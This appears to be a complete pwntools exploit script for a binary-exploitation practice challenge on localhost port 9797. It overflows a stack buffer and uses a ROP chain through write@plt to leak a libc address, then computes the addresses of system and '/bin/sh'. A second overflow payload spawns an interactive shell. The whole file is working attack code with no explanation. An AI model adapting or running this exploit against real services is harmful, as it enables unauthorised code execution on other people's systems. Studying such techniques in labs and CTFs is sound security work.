from pwn import *

p = remote("localhost", 9797)

bss_middle = 0x8049700
jump_addr = 0x80483f4

write_plt = 0x804830c
write_got = 0x8049614

write_offset = 0xdafe0
system_offset = 0x40310
binsh_offset = 0x16084c

payload = "A" * 0x88  # buf
payload += p32(bss_middle) # ebp
payload += p32(write_plt)  # ret
#payload += "AAAA"
payload += p32(jump_addr) # after_write
payload += p32(1)     # fd
payload += p32(write_got) # buf
payload += p32(4)   # size

p.send(payload)

response = p.recv(1024)

write_addr = u32(response)
libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

log.info("system addr: " + hex(system_addr))
log.info("/bin/sh addr: " + hex(binsh_addr))

payload = "B" * 0x88  # buf
payload += p32(bss_middle) # ebp
payload += p32(system_addr)  # ret
payload += "BBBB" # after_system
payload += p32(binsh_addr)

p.send(payload)

p.interactive()

p.close()
